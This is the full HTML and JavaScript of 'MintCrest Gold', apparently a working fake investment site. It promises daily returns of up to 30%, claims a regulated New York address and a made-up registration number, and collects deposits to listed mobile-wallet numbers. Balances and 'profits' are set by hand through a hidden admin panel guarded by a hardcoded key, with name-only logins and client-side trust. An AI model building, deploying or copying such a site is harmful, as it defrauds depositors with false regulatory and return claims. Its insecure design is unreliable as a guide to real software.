<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global VIP Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div id="ticker-text" class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">Loading Global Market Data... Gold Assets Secured... MintCrest NYC Node Active...</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic text-blue-300">New York • London • Dubai</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all uppercase text-sm">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Establish Secure Connection</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="mb-4 flex justify-between items-center px-2">
                <div>
                    <p class="text-[7px] font-black text-gray-500 uppercase tracking-widest">Authorized Portfolio</p>
                    <h3 id="display-username" class="text-lg font-black italic text-blue-400 uppercase tracking-tighter">Guest</h3>
                </div>
                <div class="text-right">
                    <span class="bg-blue-500/10 text-blue-500 text-[7px] px-3 py-1 rounded-full border border-blue-500/20 font-black uppercase">Verified Node</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10 text-4xl font-black italic">USA</div>
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Asset Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[10px] font-extrabold text-yellow-500 uppercase italic tracking-wider">Syncing Vault...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5">No Active Fleet</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-lg tracking-widest">Active Trading Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>
        
        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[10px] uppercase mb-2">🎁 VIP Promo Activation</h3>
                <input type="text" id="user-promo-input" placeholder="ENTER PROMO CODE" class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4 border border-yellow-500/20 outline-none uppercase">
                <button onclick="claimPromo()" class="bg-yellow-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase shadow-lg">Request Bonus</button>
            </div>

            <div class="glass p-8 rounded-[3rem] border-l-4 border-blue-500">
                <h3 class="text-blue-400 font-black text-[10px] uppercase mb-4 italic">Corporate Support</h3>
                <textarea id="support-msg" placeholder="Tell us your concern..." class="w-full bg-white/5 p-4 rounded-xl text-[10px] outline-none mb-4 font-bold h-20 border border-white/5"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase shadow-lg">Submit Message</button>
            </div>

            <div class="glass p-8 rounded-[3rem] space-y-4">
                <h3 class="text-blue-500 font-black text-[10px] uppercase text-center italic tracking-widest">Company Protocol</h3>
                
                <details class="group">
                    <summary class="list-none cursor-pointer bg-white/5 p-4 rounded-2xl text-[9px] font-bold uppercase flex justify-between items-center">🏢 Global Headquarters <span>▼</span></summary>
                    <div class="p-4 text-[9px] text-gray-400 leading-relaxed italic border-t border-white/5 mt-2">
                        MintCrest Gold is a regulated digital asset firm. <br><br>
                        <strong>Address:</strong> 45 Rockefeller Plaza, Manhattan, New York, NY 10111, USA.<br>
                        <strong>Registration:</strong> NY-7729-FINCEN.<br><br>
                        We use Gold-Backed liquidity to ensure that our users' daily ROI remains stable regardless of market volatility.
                    </div>
                </details>

                <details class="group">
                    <summary class="list-none cursor-pointer bg-white/5 p-4 rounded-2xl text-[9px] font-bold uppercase flex justify-between items-center">🔐 Privacy & High-Security <span>▼</span></summary>
                    <div class="p-4 text-[9px] text-gray-400 leading-relaxed italic border-t border-white/5 mt-2">
                        MintCrest military-grade encryption (AES-256) use karta hai. <br><br>
                        Aapka data aur transaction history hamare servers se 24 ghante baad auto-purge kar di jati hai taake anonymity barkarar rahe. <br><br>
                        Hamari policy ke mutabiq, koi bhi third party aapki investment details access nahi kar sakti.
                    </div>
                </details>

                <details class="group">
                    <summary class="list-none cursor-pointer bg-white/5 p-4 rounded-2xl text-[9px] font-bold uppercase flex justify-between items-center">✅ Guaranteed Trust <span>▼</span></summary>
                    <div class="p-4 text-[9px] text-gray-400 leading-relaxed italic border-t border-white/5 mt-2">
                        * Minimum Withdrawal: ₨ 100 <br>
                        * Automatic Payouts: 2 to 24 Hours <br>
                        * Referral Bonus: Up to 10% <br>
                        * 24/7 Verified Support Node
                    </div>
                </details>
            </div>
            
            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase italic tracking-widest">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black text-left">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>JAZZCASH</span><span class="text-blue-400 font-black">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400 font-black">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Enter Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold uppercase border border-white/5 outline-none">
                <input type="file" id="dep-proof" class="hidden">
                <button onclick="document.getElementById('dep-proof').click()" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-[8px] font-black border border-dashed border-white/20 uppercase">Upload Proof Screenshot</button>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Funding Request</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Authorize Payout</h3>
                <input type="number" id="wd-amt" placeholder="Min Withdrawal ₨ 100" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/5 outline-none">
                <input type="text" id="wd-acc" placeholder="Account Title & Wallet Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold border border-white/5 outline-none uppercase">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Submit Payout Request</button>
                <p class="text-[7px] text-gray-500 mt-6 uppercase font-bold italic">Processing Time: 2-24 Business Hours</p>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Control</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div id="adm-stats" class="grid grid-cols-3 gap-2 mb-6 text-center"></div>
        <div class="flex gap-2 mb-8">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 flex-1 py-3 rounded-xl text-[9px] font-black uppercase">Pending Logs</button>
            <button onclick="showAdmTab('users')" class="glass flex-1 py-3 rounded-xl text-[9px] font-black uppercase">User Registry</button>
        </div>
        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3">
             <input type="text" id="user-search" onkeyup="filterUsers()" placeholder="Search Name..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] outline-none border border-white/10 font-bold">
             <div id="user-list-inner"></div>
        </div>
        <div class="glass p-8 rounded-[3rem] mt-10 border-t-2 border-green-500">
             <h3 class="text-[9px] font-black uppercase mb-4 text-center text-green-500 italic italic">Manual Asset Adjustment</h3>
             <input type="text" id="adm-user" placeholder="Enter Full Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold border border-white/10 outline-none uppercase">
             <input type="number" id="adm-val" placeholder="Amount (₨)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/10 outline-none">
             <div class="grid grid-cols-2 gap-2">
                 <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Balance</button>
                 <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Profit</button>
             </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleets</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        // Firebase Config
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // 25 Master Plans Array
        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 }, { n: "Micro-Elite III", p: 800, r: 3.4, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 1500, r: 3.8, d: 30 }, { n: "Bronze-VIP", p: 2000, r: 4, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 60 }, { n: "Silver-X", p: 4000, r: 4.5, d: 60 }, { n: "Silver-VIP", p: 5000, r: 4.8, d: 60 },
            { n: "Gold-S", p: 7000, r: 5, d: 60 }, { n: "Gold-X", p: 9000, r: 5.3, d: 60 }, { n: "Gold-Master", p: 15000, r: 6, d: 60 },
            { n: "Diamond-Lite", p: 20000, r: 7, d: 60 }, { n: "Diamond-Pro", p: 30000, r: 8.5, d: 60 }, { n: "Diamond-VIP", p: 50000, r: 10, d: 60 },
            { n: "Ruby-Expert", p: 75000, r: 12, d: 90 }, { n: "Sapphire-Elite", p: 100000, r: 15, d: 90 },
            { n: "Royal Crown I", p: 150000, r: 18, d: 90 }, { n: "Royal Crown II", p: 200000, r: 20, d: 90 }, { n: "Imperial King", p: 500000, r: 25, d: 120 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, d: 1, s: true }, { n: "⚡ FLASH 48H", p: 2000, r: 15, d: 2, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, d: 7, s: true }, { n: "👑 EMPEROR", p: 100000, r: 30, d: 7, s: true },
            { n: "🎁 INVESTOR'S CHOICE", p: 100, r: 2.5, d: 15 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); // 1-Sec Timer for Countdown
            db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('promo-ticker').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } });
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 border-blue-500 mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><class="opacity-30 text-[7px]">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { 
                const totalReturn = Math.floor((p.p * p.r / 100) * p.d);
                list.innerHTML += `
                <div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2 border border-white/5">
                    <div>
                        <h4 class="font-black text-[10px] uppercase ${p.s ? 'text-blue-400' : ''}">${p.n}</h4>
                        <p class="text-[7px] text-gray-500 font-bold uppercase tracking-widest">${p.d} DAYS CONTRACT</p>
                        <p class="text-[8px] text-green-400 font-bold uppercase mt-1">${p.r}% Daily Yield</p>
                    </div>
                    <div class="text-right">
                        <div class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</div>
                        <div class="text-[6px] opacity-40 font-bold italic uppercase">Total: ₨ ${totalReturn.toLocaleString()}</div>
                    </div>
                </div>`; 
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Proof Screenshot Required!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Request Logged Successfully!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; 
            if(!a || parseInt(a) < 100) return alert("Min Withdrawal ₨ 100!");
            if(parseInt(a) > (user.balance || 0)) return alert("Insufficient Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); 
            alert("Payout Request Sent!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Insufficient Balance for this Fleet!"); changePage('wallet'); }
            else { if(confirm("Activate Asset Management Plan: "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); alert("Trading Fleet Online!"); changePage('activity'); } }
        }

        async function sendSupport() { const m = document.getElementById('support-msg').value; if(!m) return; await db.collection("requests").add({ user: user.name, type: "Support Message", msg: m, status: "pending", time: Date.now(), amount: 0 }); alert("Message Sent to HQ!"); document.getElementById('support-msg').value = ''; }
        async function claimPromo() { const c = document.getElementById('user-promo-input').value; if(!c) return; await db.collection("requests").add({ user: user.name, type: "Promo Claim", promo: c, status: "pending", time: Date.now(), amount: 0 }); alert("Promo Activation Request Sent!"); document.getElementById('user-promo-input').value = ''; }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        
        function updateCountdown() { 
            if (user && user.activeTier > 0) { 
                const d = (user.lastReqTime + 86400000) - Date.now(); 
                if(d>0) { 
                    const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000);
                    document.getElementById('countdown-display').innerText = `YIELD IN: ${h}H ${m}M ${s}S`; 
                } else { document.getElementById('countdown-display').innerText = "YIELD READY FOR SYNC"; } 
            } else { document.getElementById('countdown-display').innerText = "FLEET OFFLINE"; }
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Security Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-2 py-1 rounded text-[7px] font-black italic">📸 PROOF</button>` : '';
                    const info = d.msg ? `MSG: ${d.msg}` : (d.promo ? `PROMO: ${d.promo}` : `₨ ${d.amount}`);
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase mb-2 border-l-2 border-blue-500"><div>${d.user}<br>${d.type}<br>${info}</div><div class="flex gap-2">${pBtn}<button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">YES</button><button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-3 py-1 rounded">NO</button></div></div>`;
                });
            });
            db.collection("users").onSnapshot(snap => {
                const inner = document.getElementById('user-list-inner'); inner.innerHTML = '';
                let totalBal = 0; snap.forEach(doc => { totalBal += (doc.data().balance || 0); });
                document.getElementById('adm-stats').innerHTML = `<div class="glass p-3 rounded-xl border-b-2 border-blue-500 text-center"><p class="text-[6px] opacity-50 uppercase">Total Users</p><p class="text-[10px] font-black">${snap.size}</p></div><div class="glass p-3 rounded-xl border-b-2 border-green-500 text-center"><p class="text-[6px] opacity-50 uppercase">Net Assets</p><p class="text-[10px] font-black">₨ ${totalBal}</p></div><div class="glass p-3 rounded-xl border-b-2 border-yellow-500 text-center"><p class="text-[6px] opacity-50 uppercase">System</p><p class="text-[10px] font-black">ACTIVE</p></div>`;
                snap.forEach(doc => { const u = doc.data(); inner.innerHTML += `<div class="user-card glass p-4 rounded-xl mb-2 flex justify-between items-center text-[8px] font-black uppercase" data-name="${u.name}"><div>${u.name}</div><div>₨ ${u.balance}</div></div>`; });
            });
        }

        async function handleReq(id, uName, baseAmt, act, type) {
            if(act === 'rejected') { await db.collection("requests").doc(id).update({ status: 'rejected' }); return alert("Request Rejected!"); }
            const ref = db.collection("users").doc(uName); const doc = await ref.get(); let finalAmt = baseAmt;
            if(type === "Promo Claim") { const b = prompt("Enter Manual Bonus Amount for this User:", "50"); if(!b) return; finalAmt = parseInt(b); await db.collection("requests").doc(id).update({ amount: finalAmt }); }
            if(type === 'deposit' || type.includes('Profit') || type === 'Promo Claim') { await ref.update({ balance: (doc.data().balance||0)+finalAmt }); }
            await db.collection("requests").doc(id).update({ status: 'approved' }); alert("Success: Request Approved!");
        }

        function filterUsers() {
            const term = document.getElementById('user-search').value.toLowerCase();
            document.querySelectorAll('.user-card').forEach(c => c.style.display = c.getAttribute('data-name').toLowerCase().includes(term) ? 'flex' : 'none');
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value.trim(); const v = parseInt(document.getElementById('adm-val').value); if(!u || isNaN(v)) return alert("Invalid Data!"); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Balance Manually Updated!"); }
    </script>
</body>
</html>
